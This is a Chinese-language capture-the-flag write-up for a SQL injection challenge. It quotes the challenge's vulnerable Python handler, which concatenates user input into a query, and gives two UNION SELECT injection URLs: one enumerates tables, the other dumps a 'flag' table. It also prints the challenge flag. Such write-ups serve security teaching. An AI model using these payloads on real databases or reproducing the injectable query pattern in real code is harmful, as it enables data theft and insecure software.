wdSimpleSQLv1-1 100 points
================

题意
-------------

会长为了早日解决人生大计，特地嘱咐我们出题的时候注意一下，多宣传宣传他。为了响应会长的号召，我特地为团队写了一个大牛展示页面，但是还没写完，里面好像有问题？？？（好像忘记把会长的信息加到数据库了，逃，谁能帮我加进去下，不然会长会打死我的

(PS: Please submit the flag in database)

http://host:port

attachment: wdSimpleSQLv1.zip

解题步骤
-------------

首先找到注入点，位于 `modules.py` 中，关键部分代码：

```
@gen.coroutine
def get(self):
    response = {}
    user_id = yield self.user_author()
    if not user_id:
        self.set_status(401)
        self.redirect('/login')
        return
    cowid = str(self.get_argument('cowname', '')).strip()
    if cowid:
        sql = "select username, subject, blog, description from bigcows where username = '%s'" % cowid
        try:
            bigcow = self.db.query(sql)
        except Exception as e:
            response['Error'] = 'Unknown BigCow ID'
            self.render("bigcows.html", bigcows=None, error=response['Error'])
            return

        if len(bigcow) != 1:
            response['Error'] = "Every BigCow is Unique"
            self.render("bigcows.html", bigcows=None, error=response['Error'])
            return

        try:
            description = base64.b64decode(bigcow[0]['description']).split('\n')
        except Exception as e:
            response['Error'] = "BigCow's Description Error"
            self.render("bigcows.html", bigcows=None, error=response['Error'])
            return
        self.render('bigcow.html', bigcow=bigcow[0], description=description)

    try:
        bigcows = self.db.query("SELECT username, subject FROM bigcows")
    except Exception as e:
        response['Error'] = 'MySQL Error'
        self.render("bigcows.html", bigcows=None, error=response['Error'])
        return
    self.render('bigcows.html', bigcows=bigcows, error=None)

```

注意这一行：

```
sql = "select username, subject, blog, description from bigcows where username = '%s'" % cowid
```

是典型的字符串拼接，可以注入。然后观察我们获取到结果的条件：

1. 只能查到一条消息
2. description （第四项）是一个 Base64 格式编码

这里没有进行任何过滤，直接采用最常见的 `union select` 即可。

首先枚举有哪些表：

```
http://host:port/bigcow?cowname=%27union%20all%20select%20TABLE_NAME,TABLE_NAME,TABLE_NAME,TO_BASE64(DATA_LENGTH)%20from%20INFORMATION_SCHEMA.TABLES%20limit%201%20offset%2060%23
```

通过不断调整 `offset` ，找到最新的几个表中，有一个名为 `flag` 的表。简单尝试一下即可得到 `flag`：

```
http://host:port/bigcow?cowname=%27union%20all%20select%20flag,flag,flag,TO_BASE64(1)%20from%20flag%20limit%201%20offset%200%23
THUCTF{SQLi_Is_so_InterestiNg}
```